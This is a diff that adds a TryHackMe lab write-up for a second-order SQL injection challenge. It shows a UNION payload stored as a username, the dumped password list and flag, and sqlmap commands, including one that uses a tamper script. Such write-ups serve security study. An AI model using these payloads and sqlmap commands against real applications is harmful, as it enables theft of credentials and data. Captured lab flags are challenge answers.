@@ -331,4 +331,85 @@ Summary Table: Module 5 Details
 | Vulnerable Parameter     | username                                                                               |                                                           
 | Exploit Technique        | Boolean-Based Blind SQL Injection                                                      |
 | Automation Tool Command  | sqlmap -u "[http://10.48.174.24:5000/challenge3/login](http://10.48.174.24:5000/challenge3/login)" --data="username=admin&password=admin" --level=5 --risk=3 --dbms=sqlite --technique=B --dump                                                                         |
-| Captured Flag            | THM{f1f4e0757a09a0b87eeb2f33bca6a5cb}                                                  |                                                            
+| Captured Flag            | THM{f1f4e0757a09a0b87eeb2f33bca6a5cb}                                                  |   
+
+## SQL Injection Lab (Module 6)
+Executive Summary
+This document outlines the end-to-end vulnerability analysis and exploitation methodology for Task 7: Vulnerable Notes on TryHackMe. The challenge targets a Second-Order (Stored) SQL Injection vulnerability. Input sanitization and parameterized queries prevent direct injection during registration, but stored data is unsafely concatenated into a dynamic SQL query when user notes are retrieved, allowing complete database exfiltration.
+
+Target & Vulnerability Overview
+- Target Application: Vulnerable Notes ```([http://10.48.174.24:5000/challenge4/](http://10.48.174.24:5000/challenge4/))```
+- Target Endpoints: ```/signup```, ```/login```, ```/notes```
+- Vulnerability Class: Second-Order UNION-Based SQL Injection
+- Vulnerable Context: username parameter stored at registration and dynamically executed on the ```/notes``` page.
+- Objective: Exploit delayed SQL execution to extract user password records and recover the challenge flag.
+
+Vulnerability Mechanism Analysis
+1. Safe Ingestion Stage (```/signup & /login```)
+During account creation and login, the application processes inputs using parameterized SQL queries with placeholders (```?```). The database treats malicious strings as literal text:
+- Registration Query:
+```sql
+SELECT username FROM users WHERE username = ?
+INSERT INTO users (username, password) VALUES (?, ?)
+```
+- Authentication Query:
+```sql
+SELECT id, username FROM users WHERE username = ? AND password = ?
+```
+2. Unsafe Execution Stage (```/notes```)
+When an authenticated user visits ```/notes```, the application attempts to fetch all user-owned notes by directly concatenating the active ```username``` session variable into a raw SQL query string:
+```sql
+SELECT title, note FROM notes WHERE username = '' + username + ''
+```
+Because the stored ```username``` string contains unescaped single quotes and SQL operators, the secondary query breaks out of its string literal and executes injected payload logic.
+Step-by-Step Exploitation Walkthrough
+
+Step 1: Application Reconnaissance & Input Storage
+Navigate to ```[http://10.48.174.24:5000/challenge4/signup](http://10.48.174.24:5000/challenge4/signup)``` and register a new account using a target SQL payload in the ```username``` field.
+- Registration Payload (username):
+```sql
+' union select 1,group_concat(password) from users'
+```
+- Password Field: a (or any arbitrary string)
+
+Step 2: Authentication
+Navigate to ```[http://10.48.174.24:5000/challenge4/login](http://10.48.174.24:5000/challenge4/login)``` and log in using the newly created credentials:
+- Username: ' union select 1,group_concat(password) from users'
+- Password: a
+The application authenticates the account via parameterized lookups without triggering syntax errors.
+
+Step 3: Triggering Second-Order Execution & Exfiltration
+
+Navigate to ```[http://10.48.174.24:5000/challenge4/notes](http://10.48.174.24:5000/challenge4/notes)```. Upon loading, the application triggers the unsafe concatenation query:
+- Executed Server-Side Query:
+```sql
+SELECT title, note FROM notes WHERE username = '' union select 1,group_concat(password) from users''
+```
+- Query Behavior:
+    1. Primary query (```WHERE username = ''```) evaluates to empty.
+    2. ```UNION SELECT``` executes column 1 (```1```) into the note title position and column 2 (```group_concat(password)```) into the note body position.
+- Exfiltrated Database Output:
+```plaintext
+rcLYWHCXeGUsA9tH3GNV,asd,Summer2019!,345m3io4hj3,THM{4644c7e157fd5498e7e4026c89650814},viking123,a
+```
+Automated Exploitation Framework (```sqlmap``` & Tamper Script)Because second-order attacks require multi-step state management (Register $\rightarrow$ Login $\rightarrow$ Fetch), automated extraction requires a custom sqlmap tamper script (so-tamper.py).
+- Tamper Workflow (so-tamper.py):
+    - create_account(payload): Registers a temporary user on /signup with the sqlmap payload as the username.login(payload): Authenticates to /login to acquire the target session cookie (session=...).
+    - tamper(payload, **kwargs): Updates request headers with the session cookie prior to probing /notes.
+- Automated sqlmap Command:
+```bash
+sqlmap --tamper tamper/so-tamper.py \
+  --url "http://10.48.174.24:5000/challenge4/signup" \
+  --data="username=admin&password=asd" \
+  --second-url "http://10.48.174.24:5000/challenge4/notes" \
+  -p username --dbms=sqlite --technique=U --no-cast -T users --dump
+```
+Module Summary Table
+| Parameter / Metric              | Target Value / Result                                                         |
+|:--                              |:--                                                                            |
+| Challenge Module                | Task 7 / Challenge 4 (Vulnerable Notes)                                       |
+| Vulnerable Target URL           | [http://10.48.174.24:5000/challenge4/](http://10.48.174.24:5000/challenge4/)  | 
+| Vulnerability Class             | Second-Order (Stored) UNION-based SQL Injection                               | 
+| Vulnerable Injection Parameter  | "username (Stored via /signup, executed via /notes)"                          |
+| Exfiltration Payload            | "' union select 1,group_concat(password) from users'"                         | 
+| Captured Flag                   | THM{4644c7e157fd5498e7e4026c89650814}                                         |
